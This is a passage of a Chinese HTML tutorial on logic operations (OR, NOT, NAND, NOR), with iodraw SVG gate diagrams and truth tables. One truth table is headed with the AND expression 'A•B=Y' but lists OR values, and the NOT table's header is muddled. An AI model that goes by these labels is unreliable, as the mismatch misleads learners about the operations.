x="52" y="0" width="70" height="60" fill="#ffffff" stroke="#000000" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 68px; height: 1px; padding-top: 30px; margin-left: 53px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; "><font color="#1a1a1a"><span style="font-size: 40px">≧1</span></font></div></div></div></foreignObject><text x="87" y="34" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">≧1</text></switch></g><path d="M 122 30 L 172 30" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><rect x="167" y="20" width="30" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 30px; margin-left: 182px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; "><font style="font-size: 20px">Y</font></div></div></div></foreignObject><text x="182" y="34" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">Y</text></switch></g></g><switch><g requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"/><a transform="translate(0,-5)" xlink:href="https://desk.iodraw.com/support/solutions/articles/16000042487" target="_blank"><text text-anchor="middle" font-size="10px" x="50%" y="100%">Viewer does not support full SVG 1.1</text></a></switch></svg></p>
+<table border="1px " cellspacing="0"   style="width: 350px;height: 200px">
+    <tr align="center" >
+        <td colspan="3" >A•B=Y</td>
+    </tr>
+    <tr >
+        <td align="center">A</td>
+        <td align="center">B</td>
+        <td align="center">C</td>
+    </tr>
+        <tr align=＂center＂>
+        <td align="center">1</td>
+        <td align="center">1</td>
+        <td align="center">1</td>
+    </tr>
+    <tr align=＂center＂>
+        <td align="center">1</td>
+        <td align="center">0</td>
+        <td align="center">1</td>
+    </tr>
+     <tr align=＂center＂>
+        <td align="center">0</td>
+        <td align="center">1</td>
+        <td align="center">1</td>
+    </tr>
+     <tr align=＂center＂>
+        <td align="center">0</td>
+        <td align="center">0</td>
+        <td align="center">0</td>
+    </tr>
+
+
+
+
+<h3 id="非运算"><a href="#非运算" class="headerlink" title="非运算"></a>非运算</h3><p>非运算：取反</p>
+<p>符号：“ ￣ ”</p>
+<p>1表示真 0表示假</p>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="141px" height="41px" viewBox="-0.5 -0.5 141 41" content="&lt;mxfile host=&quot;www.iodraw.com&quot; modified=&quot;2022-12-21T09:28:30.367Z&quot; agent=&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54&quot; etag=&quot;JBqBSRpbmrL73h-XzwKV&quot; version=&quot;13.3.6&quot; type=&quot;device&quot;&gt;&lt;diagram id=&quot;XiAWfELhHhgkPWUriSza&quot; name=&quot;第 1 页&quot;&gt;1VbJbtswEP0aHQuYWrwcbSfphqIFXKDtkRWnEgFJVCnKkvP1HYnUSiVp0gRBLwbncTgk33scy/GOaf1W0jz+JBgkjrtiteNdOa7r7jz8bYCLBsg60EAkOTPQAJz4LRhwZdCSMygmiUqIRPF8CoYiyyBUE4xKKapp2i+RTHfNaQQWcAppYqPfOFOxRrfuZsDfAY/ibmey3umZlHbJ5iZFTJmoRpB37XhHKYTSo7Q+QtJw1/Gi193cMdsfTEKm/mrBx6B4/5txT37/kKw/y9r7GrwxVc40Kc2F9+a06tJRoKDGDQ6xShMECA5pwqMMxyFuDRKBM0jFkbS9mUg5Y83yg4SC39KfbakVxrngmWolCQ5OcNXUKpUotOxNaXMerAf1nRclPX1oOxApKHnBFLNgbQjvHWfiatCv0yQeSddh1Dgm6gsPpOLA8PoIjl2LY4tiyNi+MStGmchgyrbOBmYZdUYIvgwqI1D3HMVfJm7ETLDATIdJSKji5+kxlugyO3xpxB502c502cwIL0QpQzCLxkZ+oM52N62jWbDqtNr1l366nL4lJ7H0lKLMGDBj+irmCk45DZvZCtvkkr7/ZHlCZpwEtuf9BWX9l/L81iLpx3/fV8jceK/eWHYPd5YCX4PqeovATOSixW54s1lLXhubv94NxnY3QmSUj5HJJqupgObpgeR4Q5CN53kW4aT/iD52b38iq+dpRiQInqcbWa6YF3pyO8Jw+DrQ6cMnlnf9Bw==&lt;/diagram&gt;&lt;/mxfile&gt;"><defs/><g><rect x="0" y="10" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 20px; margin-left: 10px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">A</div></div></div></foreignObject><text x="10" y="24" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">A</text></switch></g><path d="M 20 20 L 50 20" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><rect x="50" y="0" width="40" height="40" fill="#ffffff" stroke="#000000" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 20px; margin-left: 51px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; ">1</div></div></div></foreignObject><text x="70" y="24" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">1</text></switch></g><rect x="120" y="10" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 20px; margin-left: 130px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">Y</div></div></div></foreignObject><text x="130" y="24" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">Y</text></switch></g><path d="M 98.5 20 L 120 20" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><ellipse cx="95" cy="20" rx="3.5" ry="3.5" fill="none" stroke="#000000" pointer-events="all"/></g><switch><g requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"/><a transform="translate(0,-5)" xlink:href="https://desk.iodraw.com/support/solutions/articles/16000042487" target="_blank"><text text-anchor="middle" font-size="10px" x="50%" y="100%">Viewer does not support full SVG 1.1</text></a></switch></svg></p>
+<table border="1px " cellspacing="0"   style="width: 350px;height: 200px">
+    <tr align="center" >
+        <td colspan="3" ><span style="text-decoration: overline">A</span> = <span style="text-decoration: overline">B</span>  </td>
+    </tr>
+    <tr >
+        <td align="center">A</td>
+        <td align="center">B</td>
+    </tr>
+        <tr align=＂center＂>
+        <td align="center">1</td>
+        <td align="center">0</td>
+    </tr>
+    <tr align=＂center＂>
+        <td align="center">0</td>
+        <td align="center">1</td>
+    </tr>
+
+
+
+
+<h3 id="与非运算"><a href="#与非运算" class="headerlink" title="与非运算"></a>与非运算</h3><p>先做与运算在做非运算</p>
+<p><span style="text-decoration: overline">A•B</span> 或 <span style="text-decoration: overline">A∧B</span> </p>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="231px" height="111px" viewBox="-0.5 -0.5 231 111" content="&lt;mxfile host=&quot;www.iodraw.com&quot; modified=&quot;2022-12-21T10:36:45.625Z&quot; agent=&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54&quot; etag=&quot;ZQdPSpo20mpTSwLctEpJ&quot; version=&quot;13.3.6&quot; type=&quot;device&quot;&gt;&lt;diagram id=&quot;XiAWfELhHhgkPWUriSza&quot; name=&quot;第 1 页&quot;&gt;7Vlbk9ogGP01Tp/qJJCbj7u69jaddsbOdPtIDZvQJiEluOr++kIgMQm6rjtR13Z9cOQAX+AcOHzBARynq3cM5fFnGuJkAKxwNYCTAQDA8cS3BNYKsGGggIiRUEMbYEYesAYtjS5IiItWQ05pwkneBuc0y/CctzDEGF22m93RpP3UHEXYAGZzlJjodxLyWKEB8Df4e0yiuHqy7Y1UTYqqxnomRYxCumxA8GYAx4xSrn6lqzFOJHcVL6rfdEdtPTCGM/6kDp/c4sOfkEB2+zHxvrAV/Oa+BSrKPUoWesJ6sHxdMYCz8EoSKUo0x9m3mGQDeB3zNBGILX6KBlOSyJIlSqo/Dg1aN+OsdEQswvyRwTk1S2J1YZpiztai33Kjg6u5jRsSVBjDCeLkvj0MpJdDVIern/CVEjFAYOmVa3s6TrVwfasdoqALNse6V5P3fYGCUTuQ4sEIJH40pr2BSlkPkNgxJLYNjRldZCEOtYTLmHA8y9Fc1i7Ftm7rreNhxvHqcY1N7aoOow4nlWgNbZ0t2jrWbhlbvB1KUmCQNDVIEtPlbSZQQiKxGSZzMW3MBCBJIcI8rnRFSsJQdr9muCAP6GcZSlKcS7XLSbjXA3ciYy04LZT99UQy8DskeybJYAvJ4Fgkg9F+tynEbuC134iWgosSa1hMWdZHha8MqOlQhiWJkm5tW20B9dbDjIgZYibXPMkiUemU3cSkb2WMoSV5VsCPEnBtvwImq/oxsrRulurI/ZtjsNccbasfJwTQ7ccJwT5LPbYT2lvWn4dS6W/q21iOe6wQFblKOu7IStpnL94IXpg3OmaSMH1z8e5oHMtbaIandEfHPKgNkk2na/BdcEZ/4zFNKCtbQ6v8PDtDO1fmFew4tg5OvLobqRvo2Hbjvgq6VdDguYLaQef8OHEm7RmCXl28Dz7BBk+aJDq+QbJ5LF86yf65STbfd15iJgTbtNV8nC0TesILzH/h6J3X9zpROtjRuwp3Ax3Z0Ss6XgXt6OA+O+dqH9HAOe0R7ZqveJd/RPv7bfCkp4drvhBe/hHdJdk5N8lwvzUdelnmHueyrL7u6vey7NcizWd6shHK+3LRvq7FbN8Zut72RXPwzZg1Go6aH6cbdwhho9o/ramaNxP/wO24vSP16H/Di+Lmbz4lyua/UnjzFw==&lt;/diagram&gt;&lt;/mxfile&gt;"><defs/><g><path d="M 100 20 L 127.76 20" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 121.88 22.33 L 128.88 20 L 121.88 17.67" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><rect x="130" y="0" width="40" height="40" fill="#ffffff" stroke="#000000" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 20px; margin-left: 131px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; ">1</div></div></div></foreignObject><text x="150" y="24" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">1</text></switch></g><rect x="210" y="10" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 20px; margin-left: 220px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">F</div></div></div></foreignObject><text x="220" y="24" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">F</text></switch></g><path d="M 178.5 20.03 L 208.2 20.32" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><ellipse cx="175" cy="20" rx="3.5" ry="3.5" fill="none" stroke="#000000" pointer-events="all"/><path d="M 198.27 25.72 L 209.32 20.33 L 198.38 14.72" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><rect x="60" y="0" width="40" height="40" fill="#ffffff" stroke="#000000" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 20px; margin-left: 61px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; ">&amp;</div></div></div></foreignObject><text x="80" y="24" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">&amp;</text></switch></g><rect x="100" y="0" width="30" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 10px; margin-left: 115px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">F’</div></div></div></foreignObject><text x="115" y="14" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">F’</text></switch></g><path d="M 20 10 L 57.76 10" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 51.88 13.5 L 58.88 10 L 51.88 6.5" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><path d="M 20 30 L 55.76 29.06" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 49.98 32.71 L 56.88 29.03 L 49.79 25.71" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><rect x="0" y="0" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 10px; margin-left: 10px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">A</div></div></div></foreignObject><text x="10" y="14" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">A</text></switch></g><rect x="0" y="20" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 30px; margin-left: 10px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">B</div></div></div></foreignObject><text x="10" y="34" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">B</text></switch></g><rect x="70" y="70" width="40" height="40" fill="#ffffff" stroke="#000000" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 90px; margin-left: 71px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; ">&amp;</div></div></div></foreignObject><text x="90" y="94" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">&amp;</text></switch></g><path d="M 30 80 L 67.76 80" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 61.88 83.5 L 68.88 80 L 61.88 76.5" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><path d="M 30 100 L 65.76 99.06" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 59.98 102.71 L 66.88 99.03 L 59.79 95.71" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><rect x="10" y="70" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 80px; margin-left: 20px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">A</div></div></div></foreignObject><text x="20" y="84" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">A</text></switch></g><rect x="10" y="90" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 100px; margin-left: 20px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">B</div></div></div></foreignObject><text x="20" y="104" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">B</text></switch></g><path d="M 117.06 90.02 L 147.76 90.32" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><ellipse cx="114.56" cy="90" rx="2.5" ry="2.5" fill="none" stroke="#000000" pointer-events="all"/><path d="M 137.83 95.72 L 148.88 90.33 L 137.94 84.72" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><rect x="150" y="80" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 90px; margin-left: 160px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">F</div></div></div></foreignObject><text x="160" y="94" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">F</text></switch></g></g><switch><g requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"/><a transform="translate(0,-5)" xlink:href="https://desk.iodraw.com/support/solutions/articles/16000042487" target="_blank"><text text-anchor="middle" font-size="10px" x="50%" y="100%">Viewer does not support full SVG 1.1</text></a></switch></svg></p>
+<table border="1px " cellspacing="0"   style="width: 350px;height: 200px">
+    <tr align="center" >
+        <td colspan="3" >与非逻辑真值表</td>
+    </tr>
+    <tr >
+        <td align="center">A</td>
+        <td align="center">B</td>
+        <td align="center">F</td>
+    </tr>
+        <tr align=＂center＂>
+        <td align="center">0</td>
+        <td align="center">0</td>
+        <td align="center">1</td>
+    </tr>
+    <tr align=＂center＂>
+        <td align="center">0</td>
+        <td align="center">1</td>
+        <td align="center">1</td>
+    </tr>
+     <tr align=＂center＂>
+        <td align="center">1</td>
+        <td align="center">0</td>
+        <td align="center">1</td>
+    </tr>
+     <tr align=＂center＂>
+        <td align="center">1</td>
+        <td align="center">1</td>
+        <td align="center">0</td>
+    </tr>
+
+
+
+<h3 id="或非运算"><a href="#或非运算" class="headerlink" title="或非运算"></a>或非运算</h3><p>先做或运算在做非运算</p>
+<p><span style="text-decoration: overline">A+B</span> 或 <span style="text-decoration: overline">A∨B</span> </p>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="231px" height="111px" viewBox="-0.5 -0.5 231 111" content="&lt;mxfile host=&quot;www.iodraw.com&quot; modified=&quot;2022-12-21T10:43:59.715Z&quot; agent=&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54&quot; etag=&quot;oGNUHKgV0JrsHOM-XZUs&quot; version=&quot;13.3.6&quot; type=&quot;device&quot;&gt;&lt;diagram id=&quot;XiAWfELhHhgkPWUriSza&quot; name=&quot;第 1 页&quot;&gt;7Vlbb9owGP010Z6GEjs3HrmU3TRtEpXWPWbETbyFOHNMCf31sxPnaihQBShdeUD42P5in2MffzEanCyzD9RLwq/ER5EGdD/T4FQDAJg2/xbApgAM6BZAQLEvoRqY40ckQV2iK+yjtNWQERIxnLTBBYljtGAtzKOUrNvN7knUfmriBUgB5gsvUtEf2GdhgbrAqfGPCAdh+WTDHhY1S69sLGeShp5P1g0I3mhwQglhxa9lNkGR4K7kpeg321FbDYyimB3U4YuVfvrrY0jvPkf2N5rBW+s9KKI8eNFKTlgOlm1KBlDsjwSRvEQSFN+GONbgOGTLiCMG/8kbzHAkSjovFf2Rr9Baj7PU0aMBYk8MzqxY4qsLkSVidMP7rWsdLMlt2JCgxCiKPIYf2sPw5HIIqnDVE74TzAcIdLlyDVvGKReuo7dDpGRFF0j2avK+L5A7bAcqeFAC8R+NaddQLusREpuKxIaiMSWr2Ee+lHAdYobmibcQtWu+rdt6y3iIMpQ9rbGqXdlh2OGkFK2hrblFW1PfLWOLt2NJchWSZgpJfLqszYQX4YBvhumCTxtRDghSMDePkaxYYt8X3ccUpfjR+5WHEhQnQu18EtZYs6Yi1oqRtLC/nkgGTodkWyUZbCEZnIpkMNzvNinfDazyG96Sc5FjDYvJy/KocAoDajqUYkm8JFsbeltAufUQxXyGiIo1j+OAV5p5Nz7pOxFjoAueC+BnDliGUwLTrHqMKG2apSpy/+bo7jVHQ+/HCQG0+nFCsM9ST+2Ehrr+boDG/XjkqJ64xwW9NCnyjXucCefsxRbBC7NFU80PZu+u3hiVE3kLzfCcxmiqZ7RCsmpyDb5TRskfNCERoXlrqOefZydnl0q63B0n1tE5V3cjdQOd2mmsN0G3Cuo+V1DD7RwdZ06ibUXQ0dX74AE2eNb80HQUksevjmTn0iSrrzovLAmCbcYqKi6WBB3w2vJfmHnnpb3KkY42867C3UAnNvOSjjdBOzpYz0632qczMM97Olvqi931n87Ofhs868Fhqe+C1386d0k2L00y3G9Nx16RWae5Iqsuufq9Ivu9WiZzOdkgzzd6cdG+LsMMxxxY9vZFc/R9mD4cDJsfsxt3AGGj2jmvqaqXEq/gTtzYkXr0v+F5sf5zrxCl/ocU3vwD&lt;/diagram&gt;&lt;/mxfile&gt;"><defs/><g><path d="M 100 20 L 127.76 20" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 121.88 22.33 L 128.88 20 L 121.88 17.67" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><rect x="130" y="0" width="40" height="40" fill="#ffffff" stroke="#000000" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 20px; margin-left: 131px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; ">1</div></div></div></foreignObject><text x="150" y="24" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">1</text></switch></g><rect x="210" y="10" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 20px; margin-left: 220px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">F</div></div></div></foreignObject><text x="220" y="24" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">F</text></switch></g><path d="M 178.5 20.03 L 208.2 20.32" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><ellipse cx="175" cy="20" rx="3.5" ry="3.5" fill="none" stroke="#000000" pointer-events="all"/><path d="M 198.27 25.72 L 209.32 20.33 L 198.38 14.72" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><rect x="60" y="0" width="40" height="40" fill="#ffffff" stroke="#000000" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 20px; margin-left: 61px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; ">≧1</div></div></div></foreignObject><text x="80" y="24" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">≧1</text></switch></g><rect x="100" y="0" width="30" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 10px; margin-left: 115px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">F’</div></div></div></foreignObject><text x="115" y="14" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">F’</text></switch></g><path d="M 20 10 L 57.76 10" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 51.88 13.5 L 58.88 10 L 51.88 6.5" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><path d="M 20 30 L 55.76 29.06" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 49.98 32.71 L 56.88 29.03 L 49.79 25.71" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><rect x="0" y="0" width="20" 